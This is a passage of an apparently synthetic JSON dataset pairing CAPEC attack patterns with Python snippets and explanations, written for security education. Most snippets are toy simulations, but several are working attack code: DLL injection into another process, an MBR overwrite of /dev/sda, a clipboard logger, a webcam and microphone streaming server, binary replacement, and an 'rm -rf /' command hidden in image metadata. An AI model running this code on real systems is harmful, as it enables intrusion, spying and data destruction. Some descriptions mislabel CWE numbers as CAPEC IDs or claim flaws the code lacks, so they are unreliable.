key\nprint(\"Captured emissions:\", emissions)",
        "description": "This Python code snippet simulates an electromagnetic side-channel attack on a cryptographic device. The `CryptoDevice` class represents a device performing cryptographic processing using a key. The `ElectromagneticSideChannelAttack` class simulates an attacker monitoring the electromagnetic emissions produced during the device's processing. The `monitor_emissions` method captures the time taken for the device to process data, which represents the emissions. In a real-world scenario, the attacker would analyze these emissions to derive sensitive information, such as cryptographic keys. This code embodies the main idea of CAPEC-201, highlighting the vulnerability of devices to electromagnetic side-channel attacks and the importance of protecting against such physical side channels (CWE-1300)."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import time\nimport random\nimport os\n\n# Simulate sensitive data processing\nsensitive_data = 'SecretKey12345'\n\n# Function to simulate data transmission with sensitive information\ndef transmit_data(data):\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    print(f'Transmitting data: {data}')\n\n# Function to simulate physical side channel emissions\ndef emit_side_channel_signals():\n    # CWE-1300: Improper Protection of Physical Side Channels\n    for _ in range(10):\n        # Simulate variations in power consumption or electromagnetic emissions\n        time.sleep(random.uniform(0.01, 0.1))\n        print(f'Power consumption: {random.randint(100, 200)} mW')\n        print(f'EM emissions: {random.randint(1, 10)} units')\n\n# Function to simulate error messages and alert signals\ndef send_alerts():\n    # CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n    print('Alert: Signal condition exceeded limit!')\n\n# Main function to demonstrate the vulnerability\ndef main():\n    # Transmit sensitive data\n    transmit_data(sensitive_data)\n    \n    # Emit side channel signals\n    emit_side_channel_signals()\n    \n    # Send alerts\n    send_alerts()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a scenario where sensitive information is transmitted and physical side channel emissions are generated, embodying the concept of a Compromising Emanations Attack (CAPEC). The code includes the following vulnerabilities:\n\n1. CWE-201: Insertion of Sensitive Information Into Sent Data - The `transmit_data` function transmits sensitive data (`sensitive_data`) without proper protection.\n2. CWE-1300: Improper Protection of Physical Side Channels - The `emit_side_channel_signals` function simulates variations in power consumption and electromagnetic emissions, which can be intercepted by an attacker.\n3. CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals - The `send_alerts` function sends an alert message that could be disabled or intercepted by an untrusted agent.\n\nThe main function demonstrates the transmission of sensitive data, generation of side channel signals, and sending of alerts, representing the main idea of a Compromising Emanations Attack."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "import time\nimport random\n\nclass Device:\n    def __init__(self):\n        self.secret_key = 'super_secret_key'\n        self.voltage = 3.3  # Normal operating voltage\n        self.clock_speed = 1.0  # Normal clock speed\n        self.temperature = 25  # Normal temperature in Celsius\n\n    def perform_cryptographic_operation(self):\n        # Simulate a cryptographic operation\n        if self.voltage < 2.5 or self.clock_speed > 1.5 or self.temperature < -10 or self.temperature > 85:\n            raise ValueError('Faulty environment detected!')\n        return 'encrypted_data'\n\n    def fault_injection_attack(self):\n        # Simulate voltage glitch\n        self.voltage = random.uniform(1.0, 2.0)\n        # Simulate clock glitch\n        self.clock_speed = random.uniform(1.5, 2.0)\n        # Simulate temperature extremes\n        self.temperature = random.choice([-20, 100])\n\n    def reset_environment(self):\n        self.voltage = 3.3\n        self.clock_speed = 1.0\n        self.temperature = 25\n\n# Simulate device operation\ndevice = Device()\n\ntry:\n    print(device.perform_cryptographic_operation())\nexcept ValueError as e:\n    print(e)\n\n# Simulate fault injection attack\ndevice.fault_injection_attack()\n\ntry:\n    print(device.perform_cryptographic_operation())\nexcept ValueError as e:\n    print(e)\n\n# Reset environment to normal\ndevice.reset_environment()\n\ntry:\n    print(device.perform_cryptographic_operation())\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet simulates a hardware device performing cryptographic operations and demonstrates how fault injection attacks can disrupt its normal behavior. The `Device` class has attributes for voltage, clock speed, and temperature, which are critical for its operation. The `perform_cryptographic_operation` method simulates a cryptographic operation and raises an error if the environment is faulty. The `fault_injection_attack` method simulates various fault injection attacks by altering the voltage, clock speed, and temperature. The main idea is to show how an adversary can exploit hardware vulnerabilities (such as improper protection against voltage and clock glitches, and temperature extremes) to cause faulty behavior in a device, potentially compromising its security."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "import time\nimport random\n\nclass MobileDevice:\n    def __init__(self):\n        self.secret_key = 'super_secret_key'\n        self.clock_speed = 1.0  # GHz\n        self.voltage = 1.0  # Volts\n        self.temperature = 25  # Celsius\n\n    def perform_cryptographic_operation(self):\n        # Simulate a cryptographic operation\n        time.sleep(0.1)\n        return 'encrypted_data'\n\n    def fault_injection_attack(self):\n        # Simulate clock glitch\n        self.clock_speed = random.uniform(0.5, 1.5)\n        # Simulate voltage glitch\n        self.voltage = random.uniform(0.8, 1.2)\n        # Simulate temperature change\n        self.temperature = random.uniform(-10, 100)\n        # Perform cryptographic operation under fault conditions\n        result = self.perform_cryptographic_operation()\n        if self.clock_speed != 1.0 or self.voltage != 1.0 or self.temperature != 25:\n            print('Fault injection detected!')\n        return result\n\n# Example usage\nmobile_device = MobileDevice()\nprint(mobile_device.fault_injection_attack())",
        "description": "This Python code snippet simulates a mobile device performing a cryptographic operation and demonstrates how fault injection attacks can be performed by manipulating clock speed, voltage, and temperature. The `MobileDevice` class has attributes for secret key, clock speed, voltage, and temperature. The `perform_cryptographic_operation` method simulates a cryptographic operation. The `fault_injection_attack` method simulates fault injection by randomly altering the clock speed, voltage, and temperature, then performing the cryptographic operation under these fault conditions. If any of these parameters deviate from their normal values, it prints a message indicating that a fault injection was detected. This code embodies the main idea of CAPEC-1247, CAPEC-1248, CAPEC-1256, CAPEC-1319, CAPEC-1332, CAPEC-1334, CAPEC-1338, and CAPEC-1351 by demonstrating how fault injection can affect a mobile device's cryptographic operations."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import cv2\nimport numpy as np\n\n# Simulate capturing an image of a touchscreen with smudges\nimage = cv2.imread('touchscreen_image_with_smudges.jpg', cv2.IMREAD_GRAYSCALE)\n\n# Apply threshold to highlight smudges\n_, smudges = cv2.threshold(image, 200, 255, cv2.THRESH_BINARY)\n\n# Find contours of the smudges\ncontours, _ = cv2.findContours(smudges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\n\n# Draw contours on the original image\ncv2.drawContours(image, contours, -1, (0, 255, 0), 3)\n\n# Save the result\ncv2.imwrite('highlighted_smudges.jpg', image)\n\nprint('Smudge pattern highlighted and saved as highlighted_smudges.jpg')",
        "description": "This Python code snippet simulates a smudge attack on a touchscreen device. It uses OpenCV to process an image of a touchscreen with smudges left by the user's fingers. The code reads the image, applies a threshold to highlight the smudges, finds the contours of the smudges, and then draws these contours on the original image. The result is saved as a new image file, 'highlighted_smudges.jpg'. This demonstrates how physical side channels (smudges) can be exploited to reveal sensitive information (e.g., password patterns). The code indirectly touches on CWE-1300 (Improper Protection of Physical Side Channels) by showing how smudges can be used to infer sensitive information."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import time\nimport random\n\nclass GPSSpoofer:\n    def __init__(self):\n        self.real_coordinates = (40.7128, -74.0060)  # Example: New York City coordinates\n        self.spoofed_coordinates = (34.0522, -118.2437)  # Example: Los Angeles coordinates\n\n    def get_gps_signal(self, spoof=False):\n        if spoof:\n            return self.spoofed_coordinates\n        return self.real_coordinates\n\n    def broadcast_signal(self, spoof=False):\n        signal = self.get_gps_signal(spoof)\n        print(f\"Broadcasting GPS signal: {signal}\")\n\n# Simulate broadcasting real and spoofed GPS signals\nspoofer = GPSSpoofer()\n\n# Broadcast real GPS signal\nspoofer.broadcast_signal(spoof=False)\n\n# Simulate delay\ntime.sleep(random.uniform(0.5, 2.0))\n\n# Broadcast spoofed GPS signal\nspoofer.broadcast_signal(spoof=True)",
        "description": "This Python code snippet simulates the concept of 'Counterfeit GPS Signals' by creating a class `GPSSpoofer` that can broadcast either real or spoofed GPS coordinates. The `get_gps_signal` method returns either the real or spoofed coordinates based on the `spoof` parameter. The `broadcast_signal` method prints the GPS signal being broadcasted. The code demonstrates broadcasting a real GPS signal, waiting for a random delay, and then broadcasting a spoofed GPS signal. This represents an adversary's attempt to deceive a GPS receiver by broadcasting counterfeit GPS signals. The code also indirectly touches on related CWEs by not verifying the source of the GPS signal and not ensuring message integrity."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import time\nimport random\n\nclass GPSSpoofingAttack:\n    def __init__(self, target_receiver):\n        self.target_receiver = target_receiver\n        self.counterfeit_signal_power = 0.1\n        self.genuine_signal_power = 1.0\n\n    def broadcast_counterfeit_signals(self):\n        while self.counterfeit_signal_power < self.genuine_signal_power:\n            print(f\"Broadcasting counterfeit signals with power: {self.counterfeit_signal_power}\")\n            self.counterfeit_signal_power += 0.1\n            time.sleep(1)\n        print(\"Counterfeit signals now stronger than genuine signals.\")\n        self.carry_off_target()\n\n    def carry_off_target(self):\n        while True:\n            spoofed_location = (random.uniform(-90, 90), random.uniform(-180, 180))\n            print(f\"Spoofed location: {spoofed_location}\")\n            time.sleep(2)\n\nclass GPSReceiver:\n    def __init__(self):\n        self.location = (0.0, 0.0)\n\n    def receive_signal(self, signal_power):\n        if signal_power > 1.0:\n            print(\"Warning: Signal power too high, possible spoofing detected!\")\n        else:\n            print(\"Receiving genuine GPS signal.\")\n\n# Example usage\nreceiver = GPSReceiver()\nattack = GPSSpoofingAttack(receiver)\nattack.broadcast_counterfeit_signals()",
        "description": "This Python code snippet simulates a GPS spoofing attack, specifically a carry-off attack. The GPSSpoofingAttack class represents the adversary's actions, starting with broadcasting counterfeit signals that gradually increase in power until they overpower the genuine GPS signals. Once the counterfeit signals are stronger, the adversary can manipulate the target's perceived location. The GPSReceiver class represents a simple GPS receiver that can detect unusually high signal power, which might indicate a spoofing attempt. This code embodies the main idea of the CAPEC by demonstrating how an attacker can gradually take control of a GPS receiver's perceived location. The related CWEs are represented by the lack of proper verification of signal sources and the potential for spoofing attacks due to insufficient authentication and message integrity checks."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import os\n\n# CWE-67: Improper Handling of Windows Device Names\n# CWE-863: Incorrect Authorization\n# CWE-772: Missing Release of Resource after Effective Lifetime\n\ndef read_file(file_path):\n    # CWE-67: Improper Handling of Windows Device Names\n    if any(device in file_path for device in ['AUX', 'CON', 'NUL', 'PRN']):\n        raise ValueError('Invalid file path containing Windows device name')\n\n    # CWE-863: Incorrect Authorization\n    if not user_has_permission(file_path):\n        raise PermissionError('User does not have permission to access this file')\n\n    try:\n        with open(file_path, 'r') as file:\n            data = file.read()\n            # Simulate resource usage\n            resource = allocate_resource()\n            return data\n    finally:\n        # CWE-772: Missing Release of Resource after Effective Lifetime\n        release_resource(resource)\n\n\ndef user_has_permission(file_path):\n    # Simulate a permission check\n    return False  # Incorrect authorization logic for demonstration\n\n\ndef allocate_resource():\n    # Simulate resource allocation\n    return 'resource'\n\n\ndef release_resource(resource):\n    # Simulate resource release\n    print(f'Resource {resource} released')\n\n# Example usage\ntry:\n    content = read_file('example.txt')\n    print(content)\nexcept (ValueError, PermissionError) as e:\n    print(e)",
        "description": "This Python code snippet demonstrates several security vulnerabilities related to the deprecated CAPEC pattern 'Unauthorized Use of Device Resources' and associated CWEs. The function `read_file` attempts to read a file while checking for Windows device names (CWE-67) and user permissions (CWE-863). It also simulates resource allocation and release, highlighting the potential issue of not releasing resources after their effective lifetime (CWE-772). The code is intentionally flawed to illustrate these vulnerabilities: it incorrectly handles device names, performs an incorrect authorization check, and demonstrates the importance of releasing resources properly."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\n\ntrusted_domains = ['example.com', 'trusted.com']\n\n@app.route('/redirect')\ndef open_redirect():\n    target = request.args.get('url')\n    if not target:\n        return 'No URL provided', 400\n    # CWE-697: Incorrect Comparison\n    if any(trusted_domain in target for trusted_domain in trusted_domains):\n        return redirect(target)\n    else:\n        return 'Untrusted URL', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that is vulnerable to TypoSquatting attacks. The application has an endpoint '/redirect' that takes a 'url' parameter from the user and redirects to it if the URL contains any of the trusted domains. However, the comparison is incorrect (CWE-697) because it only checks if the trusted domain is a substring of the target URL, which can be easily bypassed by an attacker using a TypoSquatting domain (e.g., 'trusted.com.evil.com'). This vulnerability can be exploited to perform phishing attacks by redirecting users to malicious sites that look similar to trusted ones."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "import re\nimport requests\n\ndef is_trusted_domain(domain):\n    trusted_domains = ['trusted.com', 'secure.org']\n    return domain in trusted_domains\n\ndef get_redirect_url(user_input):\n    # CWE-601: URL Redirection to Untrusted Site\n    if re.match(r'https?://', user_input):\n        return user_input\n    return 'http://' + user_input\n\ndef main():\n    user_input = input('Enter the URL: ')\n    redirect_url = get_redirect_url(user_input)\n    domain = re.findall(r'://([^/]+)/?', redirect_url)[0]\n\n    # CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n    try:\n        hostname = requests.get(f'https://dns.google/resolve?name={domain}').json()['Answer'][0]['data']\n    except Exception as e:\n        print('DNS resolution failed:', e)\n        return\n\n    # CWE-290: Authentication Bypass by Spoofing\n    if is_trusted_domain(hostname):\n        print(f'Redirecting to trusted domain: {redirect_url}')\n    else:\n        print('Untrusted domain detected!')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a simplified scenario of a SoundSquatting attack. The code takes a user input URL and attempts to redirect to it. It uses reverse DNS resolution to verify the domain, but this verification is flawed (CWE-350). The code also checks if the domain is in a list of trusted domains, but this check can be bypassed if the DNS resolution is spoofed (CWE-290). Additionally, the code allows redirection to potentially untrusted sites based on user input (CWE-601). This represents the main idea of SoundSquatting, where an adversary can exploit user confusion and redirect traffic to malicious domains."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import re\nfrom urllib.parse import urlparse\n\ndef is_valid_domain(domain):\n    # Regular expression to match valid domain names\n    domain_regex = re.compile(r'^[a-zA-Z0-9.-]+$')\n    return domain_regex.match(domain) is not None\n\ndef check_homoglyph_attack(url):\n    parsed_url = urlparse(url)\n    domain = parsed_url.netloc\n    if not is_valid_domain(domain):\n        return False\n    # List of known homoglyphs (simplified for demonstration)\n    homoglyphs = {'a': '\u0430', 'o': '\u043e', 'e': '\u0435', 'i': '\u0456', 'c': '\u0441'}\n    for char, homoglyph in homoglyphs.items():\n        if homoglyph in domain:\n            print(f\"Potential homograph attack detected: {domain}\")\n            return True\n    return False\n\n# Example usage\nurl = \"http://ex\u0430mple.com\"  # Note the '\u0430' is a Cyrillic 'a'\ncheck_homoglyph_attack(url)",
        "description": "This Python code snippet demonstrates a basic check for homograph attacks using homoglyphs. The `is_valid_domain` function uses a regular expression to validate domain names, ensuring they only contain valid characters. The `check_homoglyph_attack` function parses the URL to extract the domain and checks for the presence of known homoglyphs that could be used in a homograph attack. If a homoglyph is found in the domain, it prints a warning message indicating a potential homograph attack. This code embodies the main idea of CAPEC-1007 by highlighting the risk of visually similar characters in domain names, which can mislead users into visiting malicious sites. The related CWEs provide context for the vulnerabilities addressed, such as insufficient visual distinction of homoglyphs and improper neutralization of characters in identifiers."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import jwt\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\nSECRET_KEY = 'supersecretkey'\n\n# Simulate a user database\nusers = {\n    'user1': 'password1',\n    'user2': 'password2'\n}\n\n# Generate JWT token\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.json.get('username')\n    password = request.json.get('password')\n    if username in users and users[username] == password:\n        token = jwt.encode({'username': username}, SECRET_KEY, algorithm='HS256')\n        return jsonify({'token': token})\n    return jsonify({'message': 'Invalid credentials'}), 401\n\n# Access protected resource\n@app.route('/protected', methods=['GET'])\ndef protected():\n    token = request.headers.get('Authorization')\n    if not token:\n        return jsonify({'message': 'Token is missing'}), 403\n    try:\n        data = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])\n        # Improperly validate token, allowing impersonation\n        if 'username' in data:\n            return jsonify({'message': f'Welcome {data[\"username\"]}'}), 200\n    except jwt.ExpiredSignatureError:\n        return jsonify({'message': 'Token has expired'}), 403\n    except jwt.InvalidTokenError:\n        return jsonify({'message': 'Invalid token'}), 403\n    return jsonify({'message': 'Unauthorized access'}), 403\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask application that uses JWT tokens for authentication. The '/login' endpoint generates a JWT token for a user if the provided credentials are correct. The '/protected' endpoint is a protected resource that requires a valid JWT token for access. The code contains a vulnerability where the token validation is improperly handled, allowing an attacker to impersonate another user by crafting a token with a different username. This represents the CAPEC of 'Token Impersonation' and highlights related CWEs such as 'Improper Authentication', 'Generation of Incorrect Security Tokens', and 'Weak Authentication'."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import cv2\nimport socket\nimport threading\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-319: Cleartext Transmission of Sensitive Information\n\ndef capture_video():\n    cap = cv2.VideoCapture(0)\n    while True:\n        ret, frame = cap.read()\n        if ret:\n            # CWE-319: Transmitting video frames in cleartext\n            client_socket.sendall(frame.tobytes())\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef capture_audio():\n    import pyaudio\n    audio = pyaudio.PyAudio()\n    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)\n    while True:\n        data = stream.read(1024)\n        # CWE-319: Transmitting audio data in cleartext\n        client_socket.sendall(data)\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef start_server():\n    global client_socket\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 9999))\n    server_socket.listen(1)\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n\nif __name__ == '__main__':\n    threading.Thread(target=start_server).start()\n    threading.Thread(target=capture_video).start()\n    threading.Thread(target=capture_audio).start()",
        "description": "This Python code snippet demonstrates a simple server that captures video from a webcam and audio from a microphone, then transmits this data over a network connection. The code embodies the main idea of the CAPEC 'Probe Audio and Video Peripherals' by exploiting the system's audio and video functionalities to capture sensitive information. The code also highlights several related CWEs: CWE-267 (Privilege Defined With Unsafe Actions) by allowing the capture and transmission of sensitive data, CWE-319 (Cleartext Transmission of Sensitive Information) by sending the data in cleartext, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by potentially exposing this data to unauthorized actors. The code uses OpenCV for video capture and PyAudio for audio capture, and it transmits the captured data over a socket connection."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import os\n\n# Function to handle file upload\ndef handle_file_upload(file_path):\n    # Check the file extension\n    if file_path.endswith('.txt'):\n        # Open the file assuming it's a text file\n        with open(file_path, 'r') as file:\n            content = file.read()\n            print('File content:', content)\n    else:\n        print('Unsupported file type')\n\n# Simulate file upload\nuploaded_file = 'malicious.txt.exe'\nhandle_file_upload(uploaded_file)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Alternative Execution Due to Deceptive Filenames' (CAPEC). The function `handle_file_upload` checks the file extension to determine if it should be processed as a text file. However, it only checks if the file path ends with '.txt', which can be easily bypassed by an attacker using a deceptive filename like 'malicious.txt.exe'. This can lead to the execution of malicious code or other unintended behaviors. The code also touches on related CWEs such as 'Reliance on File Name or Extension of Externally-Supplied File' (CWE-646) and 'Improper Restriction of Names for Files and Other Resources' (CWE-641), as it relies on the file extension to determine the file type and does not properly restrict the file name."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import os\n\n# Function to hide malicious code in a file's metadata\nfrom PIL import Image\n\n# Create an image and save it with metadata\nimage = Image.new('RGB', (100, 100), color = 'red')\nmetadata = {\n    'Author': 'John Doe',\n    'Description': 'Sample Image',\n    'MaliciousCode': 'import os; os.system(\"rm -rf /\")'  # Malicious code hidden in metadata\n}\n\n# Save the image with metadata\nimage.save('sample_image.png', pnginfo=metadata)\n\n# Function to read metadata from an image file\ndef read_metadata(file_path):\n    img = Image.open(file_path)\n    info = img.info\n    return info\n\n# Read and print metadata from the image file\nmetadata_read = read_metadata('sample_image.png')\nprint(metadata_read)",
        "description": "This Python code snippet demonstrates how to hide malicious code within the metadata of an image file, embodying the main idea of the CAPEC 'Hiding Malicious Data or Code within Files'. The code uses the Python Imaging Library (PIL) to create an image and embed metadata, including a malicious payload. The 'MaliciousCode' key in the metadata dictionary contains a harmful command that could be executed if read and processed by a vulnerable application. The read_metadata function reads and prints the metadata from the image file, showing how the hidden data can be retrieved. This example highlights the risk of embedded malicious code (CWE-506) and covert storage channels (CWE-515)."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import pyperclip\nimport time\n\n# Simulate a malicious application that logs clipboard data\nlog_file = 'clipboard_log.txt'\n\nwhile True:\n    clipboard_content = pyperclip.paste()\n    with open(log_file, 'a') as f:\n        f.write(f'{clipboard_content}\\n')\n    time.sleep(5)  # Log clipboard content every 5 seconds",
        "description": "This Python code snippet demonstrates a simple malicious application that continuously monitors and logs the clipboard content to a file. The `pyperclip` library is used to access the clipboard, and the content is appended to a log file every 5 seconds. This embodies the CAPEC 'Collect Data from Clipboard' by showing how an adversary can exploit clipboard functionality to gather sensitive information. The code also touches on related CWEs: it stores sensitive information in cleartext (CWE-318, CWE-317) and exposes this information to unauthorized control spheres (CWE-497)."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import os\nimport struct\n\n# Vulnerable function to write malicious code to MBR\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n# CWE-1220: Insufficient Granularity of Access Control\n# CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n# CWE-1326: Missing Immutable Root of Trust in Hardware\n\ndef write_malicious_mbr(device_path, payload):\n    try:\n        # Open the device with write permissions\n        with open(device_path, 'rb+') as device:\n            # Read the original MBR\n            original_mbr = device.read(512)\n            \n            # Modify the MBR to include the payload\n            malicious_mbr = original_mbr[:446] + payload + original_mbr[446+len(payload):]\n            \n            # Write the malicious MBR back to the device\n            device.seek(0)\n            device.write(malicious_mbr)\n            print(\"MBR modified successfully.\")\n    except Exception as e:\n        print(f\"Failed to modify MBR: {e}\")\n\n# Example payload (malicious code)\npayload = b'\\x90' * 64  # NOP sled as a placeholder for actual malicious code\n\n# Path to the device (e.g., /dev/sda for Linux)\ndevice_path = '/dev/sda'\n\n# Execute the function to write malicious code to MBR\nwrite_malicious_mbr(device_path, payload)",
        "description": "This Python code snippet demonstrates a vulnerable function that writes malicious code to the Master Boot Record (MBR) of a specified device. The function 'write_malicious_mbr' takes a device path and a payload as arguments. It opens the device with write permissions, reads the original MBR, modifies it to include the payload, and writes the modified MBR back to the device. This embodies the main idea of the CAPEC 'Altered Component Firmware' by showing how an adversary could exploit improperly protected firmware to achieve persistence. The code also highlights related CWEs such as improper access control for volatile memory, insufficient granularity of access control, power-on of untrusted execution core, and missing immutable root of trust in hardware."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import os\n\ndef read_sensitive_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            data = file.read()\n            return data\n    except Exception as e:\n        print(f'Error reading file: {e}')\n\n# Example usage\nsensitive_file_path = '/tmp/sensitive_info.txt'\nprint(read_sensitive_file(sensitive_file_path))",
        "description": "This Python code snippet demonstrates a vulnerability where sensitive information is stored in a file located in a temporary directory ('/tmp/sensitive_info.txt') that is accessible to unauthorized users. The function 'read_sensitive_file' attempts to read the contents of the specified file and return it. If an error occurs, it prints an error message. This code embodies the main idea of the CAPEC 'Probe System Files' by showing how an adversary could access sensitive information due to improperly protected files. The related CWEs are represented by the use of an insecure temporary file (CWE-377) and the potential exposure of sensitive information (CWE-497)."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "import ctypes\nimport os\nimport sys\n\n# Vulnerable function to inject code into another process\ndef inject_code(pid, dll_path):\n    # Open the target process\n    process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)\n    if not process_handle:\n        print(f\"Failed to open process {pid}\")\n        return\n\n    # Allocate memory in the target process\n    arg_address = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, len(dll_path), 0x3000, 0x40)\n    if not arg_address:\n        print(\"Failed to allocate memory in target process\")\n        return\n\n    # Write the DLL path into the allocated memory\n    written = ctypes.c_int(0)\n    ctypes.windll.kernel32.WriteProcessMemory(process_handle, arg_address, dll_path, len(dll_path), ctypes.byref(written))\n    if written.value != len(dll_path):\n        print(\"Failed to write DLL path into target process memory\")\n        return\n\n    # Get the address of LoadLibraryA\n    load_library_addr = ctypes.windll.kernel32.GetProcAddress(ctypes.windll.kernel32._handle, b\"LoadLibraryA\")\n    if not load_library_addr:\n        print(\"Failed to get address of LoadLibraryA\")\n        return\n\n    # Create a remote thread in the target process to load the DLL\n    thread_id = ctypes.c_ulong(0)\n    if not ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, load_library_addr, arg_address, 0, ctypes.byref(thread_id)):\n        print(\"Failed to create remote thread in target process\")\n        return\n\n    print(f\"Successfully injected DLL into process {pid}\")\n\n# Example usage (this is dangerous and should not be run on a real system)\nif __name__ == \"__main__\":\n    if len(sys.argv) != 3:\n        print(\"Usage: python inject.py <pid> <dll_path>\")\n        sys.exit(1)\n\n    target_pid = int(sys.argv[1])\n    dll_to_inject = sys.argv[2].encode('utf-8')\n    inject_code(target_pid, dll_to_inject)",
        "description": "This Python code snippet demonstrates a basic example of DLL injection, which is a form of 'Inclusion of Code in Existing Process' attack. The code uses the ctypes library to interact with Windows API functions. It opens a target process, allocates memory within it, writes the path of a DLL to be injected into the allocated memory, and then creates a remote thread in the target process to load the DLL using LoadLibraryA. This can allow an attacker to execute arbitrary code within the context of another process, potentially accessing its memory and resources. This example is vulnerable to CWE-114 (Process Control) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it does not verify the integrity or trustworthiness of the DLL being injected."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import os\nimport ctypes\n\n# Vulnerable function that loads a DLL without specifying a full path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-426: Untrusted Search Path\n# CWE-706: Use of Incorrectly-Resolved Name or Reference\ndef load_dll(dll_name):\n    try:\n        # Attempt to load the DLL\n        ctypes.CDLL(dll_name)\n        print(f\"{dll_name} loaded successfully.\")\n    except OSError as e:\n        print(f\"Failed to load {dll_name}: {e}\")\n\n# Example usage\n# This could be exploited if 'malicious.dll' is placed in a directory that is searched before the intended directory\nload_dll('example.dll')",
        "description": "This Python code snippet demonstrates a vulnerable function that attempts to load a DLL without specifying a full path. This can lead to DLL side-loading attacks, where an attacker places a malicious DLL in a directory that is searched before the intended directory. The function `load_dll` uses `ctypes.CDLL` to load the DLL, which can be exploited if the search path is not properly controlled (CWE-427, CWE-426). Additionally, if the DLL name is incorrectly resolved, it can lead to loading an unintended DLL (CWE-706). This code represents the main idea of the CAPEC by showing how improper handling of DLL loading can lead to security vulnerabilities."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import os\nimport shutil\n\n# Path to the binary that will be replaced\nbinary_path = '/usr/local/bin/target_binary'\n\n# Path to the malicious binary\nmalicious_binary_path = '/tmp/malicious_binary'\n\n# Check if the binary exists and has weak permissions\nif os.path.exists(binary_path) and os.access(binary_path, os.W_OK):\n    # Replace the binary with the malicious one\n    shutil.copy(malicious_binary_path, binary_path)\n    print(f'Replaced {binary_path} with malicious binary.')\nelse:\n    print(f'Cannot replace {binary_path}. Either it does not exist or lacks write permissions.')",
        "description": "This Python code snippet demonstrates a scenario where an attacker replaces a legitimate binary with a malicious one due to weak file permissions. The code first checks if the target binary exists and if it has write permissions. If both conditions are met, it replaces the target binary with a malicious binary. This embodies the 'Replace Binaries' CAPEC by exploiting CWE-732 (Incorrect Permission Assignment for Critical Resource). The code also indirectly touches on CWE-426 (Untrusted Search Path) and CWE-428 (Unquoted Search Path or Element) by assuming the binary is in a predictable location that can be manipulated. The snippet is a simplified example of how an attacker might exploit weak permissions to introduce malicious code into a system."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
